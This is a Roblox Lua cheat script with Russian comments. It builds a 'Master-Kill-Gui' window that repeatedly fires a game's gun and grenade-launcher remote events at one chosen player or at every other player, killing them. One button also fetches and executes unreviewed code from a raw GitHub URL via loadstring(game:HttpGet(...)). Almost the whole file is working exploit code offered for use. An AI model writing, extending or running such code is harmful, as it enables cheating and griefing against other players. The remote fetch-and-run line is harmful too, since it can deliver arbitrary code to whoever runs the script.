-- Создание GUI
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local MinimizeButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")
local LeftPanel = Instance.new("Frame")
local RightPanel = Instance.new("Frame")
local LeftButtonContainer = Instance.new("Frame")
local LeftButtonList = Instance.new("UIListLayout")

ScreenGui.Name = "MasterKillGui"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -160)
MainFrame.Size = UDim2.new(0, 400, 0, 360)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ClipsDescendants = true

TitleLabel.Name = "TitleLabel"
TitleLabel.Parent = MainFrame
TitleLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
TitleLabel.BorderSizePixel = 0
TitleLabel.Size = UDim2.new(0, 340, 0, 30)
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.Text = " Master-Kill-Gui"
TitleLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
TitleLabel.TextSize = 16
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

MinimizeButton.Name = "MinimizeButton"
MinimizeButton.Parent = MainFrame
MinimizeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Position = UDim2.new(0, 340, 0, 0)
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Font = Enum.Font.SourceSansBold
MinimizeButton.Text = "<"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 16

CloseButton.Name = "CloseButton"
CloseButton.Parent = MainFrame
CloseButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(0, 370, 0, 0)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.Text = "×"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 16

LeftPanel.Name = "LeftPanel"
LeftPanel.Parent = MainFrame
LeftPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
LeftPanel.BorderSizePixel = 0
LeftPanel.Size = UDim2.new(0, 80, 1, -30)
LeftPanel.Position = UDim2.new(0, 0, 0, 30)

RightPanel.Name = "RightPanel"
RightPanel.Parent = MainFrame
RightPanel.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
RightPanel.BorderSizePixel = 0
RightPanel.Size = UDim2.new(1, -85, 1, -35)
RightPanel.Position = UDim2.new(0, 85, 0, 35)

LeftButtonContainer.Name = "LeftButtonContainer"
LeftButtonContainer.Parent = LeftPanel
LeftButtonContainer.BackgroundTransparency = 1
LeftButtonContainer.Size = UDim2.new(1, -6, 1, -6)
LeftButtonContainer.Position = UDim2.new(0, 3, 0, 3)

LeftButtonList.Name = "LeftButtonList"
LeftButtonList.Parent = LeftButtonContainer
LeftButtonList.Padding = UDim.new(0, 4)
LeftButtonList.SortOrder = Enum.SortOrder.LayoutOrder

local function createTab(tabName, displayName)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 28)
    btn.Text = displayName or tabName
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 11
    btn.BorderSizePixel = 0
    btn.Parent = LeftButtonContainer
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)

    local content = Instance.new("ScrollingFrame")
    content.Size = UDim2.new(1, -6, 1, -6)
    content.Position = UDim2.new(0, 3, 0, 3)
    content.BackgroundTransparency = 1
    content.Visible = false
    content.ScrollBarThickness = 3
    content.CanvasSize = UDim2.new(0, 0, 0, 0)
    content.AutomaticCanvasSize = Enum.AutomaticSize.Y
    content.Parent = RightPanel
    Instance.new("UIListLayout", content).Padding = UDim.new(0, 4)

    btn.MouseButton1Click:Connect(function()
        for _, child in pairs(RightPanel:GetChildren()) do
            if child:IsA("ScrollingFrame") then
                child.Visible = false
            end
        end
        content.Visible = true
    end)

    return btn, content
end

local infoBtn, infoTab = createTab("Info", "Info")
local exploitBtn, exploitTab = createTab("Exploit", "Exploit")
local everyoneBtn, everyoneTab = createTab("Everyone", "Everyone")

infoTab.Visible = true

-- ==================== INFO ====================
local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, 0, 1, 0)
infoLabel.Text = "Master Gui\n\n[Exploit] - Target specific player\n[Everyone] - Kill all players"
infoLabel.TextColor3 = Color3.new(1, 1, 1)
infoLabel.TextSize = 18
infoLabel.Font = Enum.Font.SourceSans
infoLabel.TextYAlignment = Enum.TextYAlignment.Top
infoLabel.BackgroundTransparency = 1
infoLabel.Parent = infoTab

-- ==================== EXPLOIT ====================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local targetPlayer = nil
local hyperTargetActive = false
local hyperTargetConnection = nil
local boomTargetActive = false
local boomTargetConnection = nil

-- Поиск игрока по части имени
local function findPlayer(name)
    if name == "" then return nil end
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            if string.lower(v.Name):sub(1, #name) == string.lower(name) or (v.DisplayName and string.lower(v.DisplayName):sub(1, #name) == string.lower(name)) then
                return v
            end
        end
    end
    return nil
end

-- Получение события FireEvent (gun)
local function getFireEvent()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        local gun = backpack:FindFirstChild("gun")
        if gun then
            local ev = gun:FindFirstChild("FireEvent")
            if ev then return ev end
        end
    end
    local char = LocalPlayer.Character
    if char then
        local gun = char:FindFirstChild("gun")
        if gun then
            local ev = gun:FindFirstChild("FireEvent")
            if ev then return ev end
        end
    end
    return nil
end

-- Получение события FireEvent (Grenade Launcher)
local function getBombEvent()
    local char = LocalPlayer.Character
    if char then
        local launcher = char:FindFirstChild("Grenade Launcher")
        if launcher then
            local ev = launcher:FindFirstChild("FireEvent")
            if ev then return ev end
        end
    end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        local launcher = backpack:FindFirstChild("Grenade Launcher")
        if launcher then
            local ev = launcher:FindFirstChild("FireEvent")
            if ev then return ev end
        end
    end
    return nil
end

-- Поле ввода ника
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(1, 0, 0, 20)
nameLabel.Text = "Player Name:"
nameLabel.TextColor3 = Color3.new(1, 1, 1)
nameLabel.TextSize = 14
nameLabel.Font = Enum.Font.SourceSansBold
nameLabel.BackgroundTransparency = 1
nameLabel.TextXAlignment = Enum.TextXAlignment.Left
nameLabel.Parent = exploitTab

local nameInput = Instance.new("TextBox")
nameInput.Size = UDim2.new(1, 0, 0, 25)
nameInput.PlaceholderText = "Enter name..."
nameInput.Text = ""
nameInput.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
nameInput.TextColor3 = Color3.new(1, 1, 1)
nameInput.Font = Enum.Font.SourceSans
nameInput.TextSize = 14
nameInput.Parent = exploitTab
Instance.new("UICorner", nameInput).CornerRadius = UDim.new(0, 4)

-- Hyper-Kill Target
local hyperTargetBtn = Instance.new("TextButton")
hyperTargetBtn.Size = UDim2.new(1, 0, 0, 32)
hyperTargetBtn.Text = "Hyper-kill OFF"
hyperTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
hyperTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
hyperTargetBtn.Font = Enum.Font.SourceSansBold
hyperTargetBtn.TextSize = 13
hyperTargetBtn.BorderSizePixel = 0
hyperTargetBtn.Parent = exploitTab
Instance.new("UICorner", hyperTargetBtn).CornerRadius = UDim.new(0, 4)

hyperTargetBtn.MouseButton1Click:Connect(function()
    hyperTargetActive = not hyperTargetActive
    
    if hyperTargetActive then
        local target = findPlayer(nameInput.Text)
        if not target then
            hyperTargetActive = false
            hyperTargetBtn.Text = "Hyper-kill OFF"
            hyperTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            hyperTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
            print("❌ Игрок не найден!")
            return
        end
        targetPlayer = target
        hyperTargetBtn.Text = "Hyper-kill ON - " .. target.Name
        hyperTargetBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
        hyperTargetBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        
        local ev = getFireEvent()
        if not ev then
            warn("❌ FireEvent не найден!")
        else
            print("✅ FireEvent найден! Готов к стрельбе по " .. target.Name)
        end
        
        hyperTargetConnection = RunService.Heartbeat:Connect(function()
            if not hyperTargetActive then
                hyperTargetConnection:Disconnect()
                hyperTargetConnection = nil
                return
            end
            if not targetPlayer or not targetPlayer.Character then return end
            local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local ev = getFireEvent()
            if ev then
                pcall(function()
                    ev:FireServer(hrp.Position)
                end)
            end
        end)
    else
        hyperTargetBtn.Text = "Hyper-kill OFF"
        hyperTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        hyperTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
        if hyperTargetConnection then
            hyperTargetConnection:Disconnect()
            hyperTargetConnection = nil
        end
        targetPlayer = nil
        print("✅ Hyper-kill выключен")
    end
end)

-- Boom-Kill Target
local boomTargetBtn = Instance.new("TextButton")
boomTargetBtn.Size = UDim2.new(1, 0, 0, 32)
boomTargetBtn.Text = "Boom-kill OFF"
boomTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
boomTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
boomTargetBtn.Font = Enum.Font.SourceSansBold
boomTargetBtn.TextSize = 13
boomTargetBtn.BorderSizePixel = 0
boomTargetBtn.Parent = exploitTab
Instance.new("UICorner", boomTargetBtn).CornerRadius = UDim.new(0, 4)

boomTargetBtn.MouseButton1Click:Connect(function()
    boomTargetActive = not boomTargetActive
    
    if boomTargetActive then
        local target = findPlayer(nameInput.Text)
        if not target then
            boomTargetActive = false
            boomTargetBtn.Text = "Boom-kill OFF"
            boomTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
            boomTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
            print("❌ Игрок не найден!")
            return
        end
        targetPlayer = target
        boomTargetBtn.Text = "Boom-kill ON - " .. target.Name
        boomTargetBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
        boomTargetBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        
        local ev = getBombEvent()
        if not ev then
            warn("❌ FireEvent (Grenade Launcher) не найден!")
        else
            print("✅ FireEvent найден! Готов к бомбёжке " .. target.Name)
        end
        
        boomTargetConnection = RunService.Heartbeat:Connect(function()
            if not boomTargetActive then
                boomTargetConnection:Disconnect()
                boomTargetConnection = nil
                return
            end
            if not targetPlayer or not targetPlayer.Character then return end
            local hrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local ev = getBombEvent()
            if ev then
                pcall(function()
                    ev:FireServer(hrp.Position)
                end)
            end
        end)
    else
        boomTargetBtn.Text = "Boom-kill OFF"
        boomTargetBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        boomTargetBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
        if boomTargetConnection then
            boomTargetConnection:Disconnect()
            boomTargetConnection = nil
        end
        targetPlayer = nil
        print("✅ Boom-kill выключен")
    end
end)

-- ==================== EVERYONE ====================
local hyperAllActive = false
local hyperAllConnection = nil
local boomAllActive = false
local boomAllConnection = nil

local function getPlayerPosition(player)
    if not player or not player.Character then return nil end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    return hrp.Position
end

local function shootAllPlayers()
    local ev = getFireEvent()
    if not ev then return end
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local pos = getPlayerPosition(player)
            if pos then
                pcall(function() ev:FireServer(pos) end)
            end
        end
    end
end

local function bombAllPlayers()
    local ev = getBombEvent()
    if not ev then return end
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local pos = getPlayerPosition(player)
            if pos then
                pcall(function() ev:FireServer(pos) end)
            end
        end
    end
end

-- Hyper-kill-all
local hyperAllBtn = Instance.new("TextButton")
hyperAllBtn.Size = UDim2.new(1, 0, 0, 32)
hyperAllBtn.Text = "Hyper-kill-all OFF"
hyperAllBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
hyperAllBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
hyperAllBtn.Font = Enum.Font.SourceSansBold
hyperAllBtn.TextSize = 13
hyperAllBtn.BorderSizePixel = 0
hyperAllBtn.Parent = everyoneTab
Instance.new("UICorner", hyperAllBtn).CornerRadius = UDim.new(0, 4)

hyperAllBtn.MouseButton1Click:Connect(function()
    hyperAllActive = not hyperAllActive
    
    if hyperAllActive then
        hyperAllBtn.Text = "Hyper-kill-all ON"
        hyperAllBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
        hyperAllBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        
        local ev = getFireEvent()
        if not ev then
            warn("❌ FireEvent не найден!")
        else
            print("✅ FireEvent найден! Готов к стрельбе по всем.")
        end
        
        hyperAllConnection = RunService.Heartbeat:Connect(function()
            if not hyperAllActive then
                hyperAllConnection:Disconnect()
                hyperAllConnection = nil
                return
            end
            shootAllPlayers()
        end)
    else
        hyperAllBtn.Text = "Hyper-kill-all OFF"
        hyperAllBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        hyperAllBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
        if hyperAllConnection then
            hyperAllConnection:Disconnect()
            hyperAllConnection = nil
        end
        print("✅ Hyper-kill-all выключен")
    end
end)

-- Boom-all
local boomAllBtn = Instance.new("TextButton")
boomAllBtn.Size = UDim2.new(1, 0, 0, 32)
boomAllBtn.Text = "Boom-all OFF"
boomAllBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
boomAllBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
boomAllBtn.Font = Enum.Font.SourceSansBold
boomAllBtn.TextSize = 13
boomAllBtn.BorderSizePixel = 0
boomAllBtn.Parent = everyoneTab
Instance.new("UICorner", boomAllBtn).CornerRadius = UDim.new(0, 4)

boomAllBtn.MouseButton1Click:Connect(function()
    boomAllActive = not boomAllActive
    
    if boomAllActive then
        boomAllBtn.Text = "Boom-all ON"
        boomAllBtn.BackgroundColor3 = Color3.fromRGB(85, 255, 85)
        boomAllBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        
        local ev = getBombEvent()
        if not ev then
            warn("❌ FireEvent (Grenade Launcher) не найден!")
        else
            print("✅ FireEvent найден! Готов к бомбёжке всех.")
        end
        
        boomAllConnection = RunService.Heartbeat:Connect(function()
            if not boomAllActive then
                boomAllConnection:Disconnect()
                boomAllConnection = nil
                return
            end
            bombAllPlayers()
        end)
    else
        boomAllBtn.Text = "Boom-all OFF"
        boomAllBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        boomAllBtn.TextColor3 = Color3.fromRGB(255, 85, 85)
        if boomAllConnection then
            boomAllConnection:Disconnect()
            boomAllConnection = nil
        end
        print("✅ Boom-all выключен")
    end
end)

-- ==================== GIVE MUSOR-BUTTON (EVERYONE) ====================
local musorBtn = Instance.new("TextButton")
musorBtn.Size = UDim2.new(1, 0, 0, 32)
musorBtn.Text = "Give Musor-button"
musorBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
musorBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
musorBtn.Font = Enum.Font.SourceSansBold
musorBtn.TextSize = 13
musorBtn.BorderSizePixel = 0
musorBtn.Parent = everyoneTab
Instance.new("UICorner", musorBtn).CornerRadius = UDim.new(0, 4)

musorBtn.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/monyhh057-dotcom/noa/main/ss.lua"))()
end)

-- ==================== УПРАВЛЕНИЕ ОКНОМ ====================
local isMinimized = false
MinimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    if isMinimized then
        MainFrame:TweenSize(UDim2.new(0, 400, 0, 30), "Out", "Quad", 0.2, true)
        LeftPanel.Visible = false
        RightPanel.Visible = false
        MinimizeButton.Text = ">"
    else
        MainFrame:TweenSize(UDim2.new(0, 400, 0, 360), "Out", "Quad", 0.2, true)
        LeftPanel.Visible = true
        RightPanel.Visible = true
        MinimizeButton.Text = "<"
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    hyperTargetActive = false
    boomTargetActive = false
    hyperAllActive = false
    boomAllActive = false
    if hyperTargetConnection then hyperTargetConnection:Disconnect() end
    if boomTargetConnection then boomTargetConnection:Disconnect() end
    if hyperAllConnection then hyperAllConnection:Disconnect() end
    if boomAllConnection then boomAllConnection:Disconnect() end
    ScreenGui:Destroy()
    collectgarbage()
end)

infoBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 120)
infoBtn.TextColor3 = Color3.new(1, 1, 1)
